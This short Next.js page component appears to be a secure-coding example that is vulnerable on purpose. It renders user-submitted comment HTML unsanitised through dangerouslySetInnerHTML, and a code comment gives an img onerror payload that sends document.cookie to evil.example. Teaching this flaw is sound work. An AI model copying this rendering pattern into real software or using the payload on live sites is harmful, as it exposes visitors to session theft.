// VULNERABLE EXAMPLE - do not copy into production code.
// app/comments/[id]/page.tsx

declare function getComment(id: string): Promise<{ author: string; bodyHtml: string }>;

export default async function CommentPage({ params }: { params: { id: string } }) {
  const comment = await getComment(params.id);
  // bodyHtml is user-submitted. A comment such as
  //   <img src=x onerror="fetch('https://evil.example/?c='+document.cookie)">
  // runs in every visitor's browser.
  return (
    <article>
      <h2>{comment.author}</h2>
      <div dangerouslySetInnerHTML={{ __html: comment.bodyHtml }} />
    </article>
  );
}
